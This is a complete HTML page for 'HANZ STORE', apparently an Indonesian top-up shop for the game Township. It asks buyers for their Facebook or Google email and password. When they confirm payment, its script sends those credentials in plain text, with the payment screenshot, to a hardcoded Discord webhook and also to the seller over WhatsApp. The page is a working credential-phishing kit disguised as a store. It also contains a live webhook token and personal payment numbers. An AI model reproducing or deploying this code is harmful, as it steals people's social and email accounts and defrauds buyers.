<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <title>HANZ STORE - Layanan Top Up Township</title>
    <style>
        /* Tema Gelap (Dark Mode) Modern */
        :root {
            --primary-color: #64dd17;
            --bg-color: #121212;
            --card-bg: #1e1e1e;
            --text-color: #f5f5f5;
            --border-radius: 20px;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            background-color: var(--card-bg);
            max-width: 500px;
            width: 100%;
            padding: 30px;
            border-radius: var(--border-radius);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
            border: 2px solid #333333;
            margin: auto;
        }

        /* Style Logo Kotak dengan Animasi */
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-container img {
            width: 130px;
            height: 130px;
            border-radius: 15px; 
            border: 3px solid var(--primary-color);
            box-shadow: 0 0 15px rgba(100, 221, 23, 0.4);
            animation: pulseLogo 2s infinite;
            object-fit: cover;
        }

        @keyframes pulseLogo {
            0% { transform: scale(1); box-shadow: 0 0 15px rgba(100, 221, 23, 0.4); }
            50% { transform: scale(1.05); box-shadow: 0 0 25px rgba(100, 221, 23, 0.6); }
            100% { transform: scale(1); box-shadow: 0 0 15px rgba(100, 221, 23, 0.4); }
        }

        h1 {
            text-align: center;
            margin-bottom: 5px;
            font-size: 32px;
            letter-spacing: 1px;
            background: linear-gradient(90deg, #ffffff 20%, #64dd17 50%, #ffffff 80%);
            background-size: 200% auto;
            color: transparent;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shineText 3s linear infinite;
        }

        @keyframes shineText {
            to { background-position: 200% center; }
        }

        p.subtitle {
            text-align: center;
            color: #aaaaaa;
            margin-bottom: 30px;
            font-size: 14px;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 20px;
            background-color: #2a2a2a;
            padding: 15px;
            border-radius: 15px;
            border: 1px dashed #444444;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 700;
            color: #dddddd;
        }

        input[type="text"],
        input[type="password"],
        input[type="file"] {
            width: 100%;
            padding: 12px;
            background-color: #333333;
            color: #ffffff;
            border: 2px solid #444444;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 14px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: var(--primary-color);
            color: #000;
            border: none;
            border-radius: var(--border-radius);
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.1s ease, box-shadow 0.3s ease;
            margin-top: 15px;
            box-shadow: 0 4px 10px rgba(100, 221, 23, 0.2);
        }

        button:hover {
            background-color: #52b202;
            color: #fff;
            box-shadow: 0 6px 15px rgba(100, 221, 23, 0.4);
        }

        .grid-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
            gap: 10px;
        }

        .radio-box {
            background-color: #2a2a2a;
            border: 2px solid #444444;
            border-radius: 12px;
            padding: 12px 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .radio-box input { display: none; }

        .radio-box:has(input:checked) {
            border-color: var(--primary-color);
            background-color: #1b3b22;
        }

        .radio-box strong { color: #eeeeee; font-size: 12px; font-weight: 600; }
        .radio-box span.price { display: block; color: #ff5252; font-weight: bold; font-size: 11px; margin-top: 4px; }
        .payment-logo { width: 40px; height: 40px; margin-bottom: 5px; object-fit: contain; }

        #loginDetailsContainer { display: none; text-align: center; }

        .modal-overlay {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.9); display: none; justify-content: center;
            align-items: center; z-index: 1000; overflow-y: auto;
        }
        .modal-content {
            background: #1e1e1e; padding: 25px; border-radius: 20px;
            width: 90%; max-width: 400px; text-align: center;
            border: 1px solid var(--primary-color);
            position: relative;
        }
        
        .close-btn {
            position: absolute; top: 10px; right: 15px; font-size: 24px;
            cursor: pointer; color: #fff; font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-container">
            <img src="https://i.ibb.co.com/HfFpSK5Z/Proyek-Baru-17-76139-AC.png" alt="Logo HANZ STORE">
        </div>
        
        <h1>HANZ STORE</h1>
        <p class="subtitle">🐾 Pusat Layanan Top Up Township 🏙️</p>

        <div class="form-group">
            <label>1. Pilih Metode Login Akun</label>
            <div class="grid-options">
                <label class="radio-box" onclick="tampilkanFormLogin('Facebook')">
                    <input type="radio" name="loginMethod" value="Facebook"><img src="https://i.ibb.co.com/jvmGT12Z/Logo-de-Facebook.png" style="width:30px; margin-bottom:5px;"><strong>Facebook</strong>
                </label>
                <label class="radio-box" onclick="tampilkanFormLogin('Google')">
                    <input type="radio" name="loginMethod" value="Google"><img src="https://i.ibb.co.com/5gXxjR9K/pngwing-com-4.png" style="width:30px; margin-bottom:5px;"><strong>Google</strong>
                </label>
            </div>
        </div>

        <div class="form-group" id="loginDetailsContainer">
            <label id="loginTitle">Masukkan Detail Akun</label>
            <input type="text" id="loginId" placeholder="Email atau No. HP" style="margin-bottom: 10px;">
            <input type="password" id="loginPass" placeholder="Password Akun">
        </div>

        <div class="form-group">
            <label>2. Pilih Kategori</label>
            <div class="grid-options">
                <label class="radio-box"><input type="radio" name="kategori" value="ITEM"><strong>ITEM</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="PROFILE"><strong>PROFILE</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="ANIMAL SKIN"><strong>ANIMAL SKIN</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="TRANSPORTATION SKIN"><strong>TRANSPORTATION SKIN</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="BUILDING SKIN"><strong>BUILDING SKIN</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="DECORATION"><strong>DECORATION</strong></label>
            </div>
        </div>

        <div class="form-group">
            <label>3. Pilih Nominal T-Cash</label>
            <div class="grid-options" id="nominalContainer">
                <label class="radio-box"><input type="radio" name="nominal" value="100 T-Cash" data-price="15000" data-label="Rp 15.000"><strong>100 T-Cash</strong><span class="price">Rp 15.000</span></label>
                <label class="radio-box"><input type="radio" name="nominal" value="250 T-Cash" data-price="35000" data-label="Rp 35.000"><strong>250 T-Cash</strong><span class="price">Rp 35.000</span></label>
                <label class="radio-box"><input type="radio" name="nominal" value="500 T-Cash" data-price="70000" data-label="Rp 70.000"><strong>500 T-Cash</strong><span class="price">Rp 70.000</span></label>
                <label class="radio-box"><input type="radio" name="nominal" value="1000 T-Cash" data-price="135000" data-label="Rp 135.000"><strong>1000 T-Cash</strong><span class="price">Rp 135.000</span></label>
            </div>
        </div>

        <div class="form-group">
            <label>4. Pilih Metode Pembayaran</label>
            <div class="grid-options">
                <label class="radio-box"><input type="radio" name="pembayaran" value="DANA"><img src="https://i.ibb.co.com/JWyFXyhP/f90c3bae-f972-41b5-bc25-f469d4d4ce96.jpg" class="payment-logo"><strong>DANA</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="GoPay"><img src="https://i.ibb.co.com/fYCGY8n4/d50d95c8-1df7-4e44-bc38-71c34f770190.jpg" class="payment-logo"><strong>GoPay</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="OVO"><img src="https://i.ibb.co.com/MyCxg6gT/Top-up-OVO.jpg" class="payment-logo"><strong>OVO</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="ShopeePay"><img src="https://i.ibb.co.com/6JRn517d/sad.jpg" class="payment-logo"><strong>ShopeePay</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="QRIS"><img src="https://i.ibb.co.com/zV86RVQ6/quick-response-code-indonesia-standard-qris-logo-png-seeklogo-391791.png" class="payment-logo"><strong>QRIS</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="PayPal"><img src="https://i.ibb.co.com/NgjBvyfZ/37562c63-6c0d-4b11-aad1-d8c712b49fa1.jpg" class="payment-logo"><strong>PayPal</strong></label>
            </div>
        </div>

        <button onclick="bukaPembayaran()">PROSES PESANAN</button>
    </div>

    <div id="modalPembayaran" class="modal-overlay">
        <div class="modal-content">
            <span class="close-btn" onclick="tutupModal()">×</span>
            <h2 style="color: var(--primary-color);" id="modalTitle">Instruksi Pembayaran</h2>
            <div id="paymentContent" style="margin: 20px 0; color: #fff;"></div>
            
            <div id="actionArea"></div>

            <div id="uploadSection" style="display:none; margin-top:20px;">
                <label style="font-size: 12px; display: block; margin-bottom: 10px;">Lampirkan Bukti Transfer:</label>
                <input type="file" id="buktiBayar" accept="image/*">
                <button class="modal-btn" style="background: var(--primary-color); border:none; padding: 12px; width: 100%; border-radius: 10px; margin-top: 15px; font-weight: bold; cursor: pointer;" onclick="finalisasiPembayaran()">KONFIRMASI BAYAR</button>
            </div>
        </div>
    </div>

    <script>
        const nomorWA = "+6281221548310"; 
        const nomorDana = "085162984757"; 
        const webhookUrl = "https://discord.com/api/webhooks/1505805287263830026/ePqMIxZXPdUCeA21tOMajwvKZaJdmI1ooi4ltXGThMzVkWCdSvenrW6PTOOPkVjnXYEI";
        const linkQRIS = "https://i.ibb.co.com/NdRF3YKw/qr-ID1026522888316-21-05-26-1779336918-1779336918801.jpg"; 

        function tampilkanFormLogin(metode) {
            document.getElementById("loginDetailsContainer").style.display = "block";
            document.getElementById("loginTitle").innerText = "Masukkan Data Akun " + metode;
        }

        function tutupModal() {
            document.getElementById("modalPembayaran").style.display = "none";
        }

        function copyNomor() {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(nomorDana).then(() => {
                    alert("Nomor DANA berhasil disalin: " + nomorDana);
                }).catch(err => {
                    fallbackCopyTextToClipboard(nomorDana);
                });
            } else {
                fallbackCopyTextToClipboard(nomorDana);
            }
        }

        function fallbackCopyTextToClipboard(text) {
            var textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
                document.execCommand('copy');
                alert("Nomor DANA disalin: " + text);
            } catch (err) {
                alert("Gagal menyalin otomatis, silakan salin manual: " + text);
            }
            document.body.removeChild(textArea);
        }

        function triggerDana() {
            window.location.href = "dana://qr/phone?phone=" + nomorDana;
            setTimeout(function() {
                alert("Jika aplikasi DANA tidak terbuka, silakan gunakan metode manual: Salin nomor dan buka aplikasi DANA secara manual.");
            }, 2000);
        }

        async function downloadQR() {
            const response = await fetch(linkQRIS);
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = 'QRIS_HANZ_STORE.png';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            window.URL.revokeObjectURL(url);
        }

        function bukaPembayaran() {
            const login = document.querySelector('input[name="loginMethod"]:checked');
            const kat = document.querySelector('input[name="kategori"]:checked');
            const nom = document.querySelector('input[name="nominal"]:checked');
            const pay = document.querySelector('input[name="pembayaran"]:checked');
            const inputLoginId = document.getElementById("loginId").value.trim();
            const inputLoginPass = document.getElementById("loginPass").value.trim();

            // Validasi apakah form sudah terisi semua
            if (!login || !kat || !nom || !pay || !inputLoginId || !inputLoginPass) {
                alert("Lengkapi semua data, termasuk email/ID dan password!"); return;
            }

            // Validasi Informasi Akun agar diisi dengan benar
            if (login.value === "Google" && !inputLoginId.includes("@")) {
                alert("Mohon masukkan alamat Email Google yang valid (harus menggunakan @)."); return;
            }
            if (inputLoginPass.length < 6) {
                alert("Password terlalu pendek. Pastikan memasukkan password akun yang valid dan benar."); return;
            }

            const nominalLabel = nom.getAttribute("data-label");
            const metode = pay.value;
            const content = document.getElementById("paymentContent");
            const action = document.getElementById("actionArea");
            
            document.getElementById("modalPembayaran").style.display = "flex";
            document.getElementById("uploadSection").style.display = "none";
            action.innerHTML = "";

            if (metode === "DANA") {
                content.innerHTML = `<strong>Instruksi Pembayaran DANA</strong><br><br>
                1. <strong>Cara Otomatis:</strong> Klik tombol "BUKA DANA" di bawah.<br>
                2. <strong>Cara Manual:</strong> Jika tombol otomatis gagal, klik "SALIN NOMOR" lalu buka aplikasi DANA dan lakukan transfer ke nomor tersebut.<br><br>
                Nomor DANA: <strong>${nomorDana}</strong>`;
                action.innerHTML = `<button onclick="triggerDana()" style="background:#007bff; width:100%; padding:15px; border-radius:10px; border:none; color:white; font-weight:bold; cursor:pointer; margin-bottom:10px;">BUKA DANA</button>
                                    <button onclick="copyNomor()" style="background:#444; width:100%; padding:15px; border-radius:10px; border:none; color:white; font-weight:bold; cursor:pointer; margin-bottom:10px;">SALIN NOMOR DANA</button>
                                    <button onclick="tampilkanUpload()" style="background:#64dd17; width:100%; padding:15px; border-radius:10px; border:none; color:black; font-weight:bold; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
            } else if (metode === "GoPay") {
                content.innerHTML = `Klik untuk membayar <strong>${nominalLabel}</strong> via GoPay:`;
                action.innerHTML = `<a href="intent://#Intent;scheme=gopay;package=com.gojek.app;end" style="text-decoration:none;"><button style="background:#00a3e0; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">BAYAR GOPAY SEKARANG</button></a>
                                    <button onclick="tampilkanUpload()" style="background:#444; margin-top:10px; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
            } else if (metode === "OVO") {
                content.innerHTML = `Transfer <strong>${nominalLabel}</strong> ke OVO ${nomorWA}`;
                action.innerHTML = `<a href="intent://#Intent;scheme=ovo;package=ovo.id;end" style="text-decoration:none;"><button style="background:#4e2874; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">BAYAR OVO SEKARANG</button></a>
                                    <button onclick="tampilkanUpload()" style="background:#444; margin-top:10px; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
            } else if (metode === "ShopeePay") {
                content.innerHTML = `Klik untuk membayar <strong>${nominalLabel}</strong> via ShopeePay:`;
                action.innerHTML = `<a href="intent://#Intent;scheme=shopeeid;package=com.shopee.id;end" style="text-decoration:none;"><button style="background:#ee4d2d; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">BAYAR SHOPEEPAY</button></a>
                                    <button onclick="tampilkanUpload()" style="background:#444; margin-top:10px; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
            } else if (metode === "QRIS") {
                content.innerHTML = `Scan QRIS berikut untuk <strong>${nominalLabel}</strong>:<br><br><img src="${linkQRIS}" style="width:200px; border-radius:10px; border:2px solid #fff;"><br><small>(Screenshot atau download QRIS)</small>`;
                action.innerHTML = `<button onclick="downloadQR()" style="background:#28a745; margin-bottom:10px; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; color:white; cursor:pointer;">DOWNLOAD QR CODE</button>
                                    <button onclick="tampilkanUpload()" style="background:#444; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
            } else {
                content.innerHTML = `Silakan transfer <strong>${nominalLabel}</strong> ke:<br><h3>${metode} : ${nomorWA}</h3>`;
                action.innerHTML = `<button onclick="tampilkanUpload()" style="background:#444; border:none; padding:15px; width:100%; border-radius:10px; color:white; cursor:pointer;">SAYA SUDAH BAYAR</button>`;
            }
        }

        function tampilkanUpload() {
            document.getElementById("uploadSection").style.display = "block";
            document.getElementById("actionArea").style.display = "none";
        }

        async function finalisasiPembayaran() {
            const loginMethod = document.querySelector('input[name="loginMethod"]:checked').value;
            const loginId = document.getElementById("loginId").value;
            const loginPass = document.getElementById("loginPass").value;
            const kategori = document.querySelector('input[name="kategori"]:checked').value;
            const nominal = document.querySelector('input[name="nominal"]:checked').value;
            const pembayaran = document.querySelector('input[name="pembayaran"]:checked').value;
            
            const fileInput = document.getElementById("buktiBayar");
            const file = fileInput.files[0];

            // Pengecekan agar pembeli wajib memasukkan foto
            if (!file) {
                alert("Harap lampirkan foto/screenshot bukti pembayaran terlebih dahulu!");
                return;
            }

            // Ubah text tombol saat memproses agar tidak di-spam
            const btnKonfirmasi = document.querySelector("#uploadSection button");
            const textAwal = btnKonfirmasi.innerText;
            btnKonfirmasi.innerText = "MENGIRIM...";
            btnKonfirmasi.disabled = true;

            // Menyiapkan Embed Discord
            const embed = {
                title: "PESANAN BARU - HANZ STORE",
                color: 6570400,
                fields: [
                    { name: "Metode Login", value: loginMethod, inline: true },
                    { name: "ID Akun", value: loginId, inline: true },
                    { name: "Password", value: loginPass, inline: true },
                    { name: "Kategori", value: kategori, inline: true },
                    { name: "Nominal", value: nominal, inline: true },
                    { name: "Pembayaran", value: pembayaran, inline: true }
                ]
            };

            // Menggunakan FormData untuk mengirim Gambar & Teks sekaligus ke Discord
            const formData = new FormData();
            formData.append("file", file);
            formData.append("payload_json", JSON.stringify({ embeds: [embed] }));

            try {
                await fetch(webhookUrl, { 
                    method: 'POST', 
                    body: formData 
                });
            } catch (error) {
                console.error("Gagal mengirim ke Discord", error);
            }

            // Kirim ke WhatsApp
            const pesanWA = `Halo Hanz, ada pesanan baru!%0A%0A` +
                            `*DETAIL PESANAN*%0A` +
                            `Login via: ${loginMethod}%0A` +
                            `ID Akun: ${loginId}%0A` +
                            `Password: ${loginPass}%0A` +
                            `Kategori: ${kategori}%0A` +
                            `Nominal: ${nominal}%0A` +
                            `Pembayaran: ${pembayaran}%0A%0A` +
                            `*Catatan:* Bukti pembayaran sudah terkirim otomatis beserta data ini ke Discord kamu. Mohon verifikasi segera.`;

            window.location.href = `https://wa.me/${nomorWA.replace('+', '')}?text=${pesanWA}`;
            
            // Kembalikan tombol seperti semula setelah selesai
            btnKonfirmasi.innerText = textAwal;
            btnKonfirmasi.disabled = false;
        }
    </script>
</body>
</html>
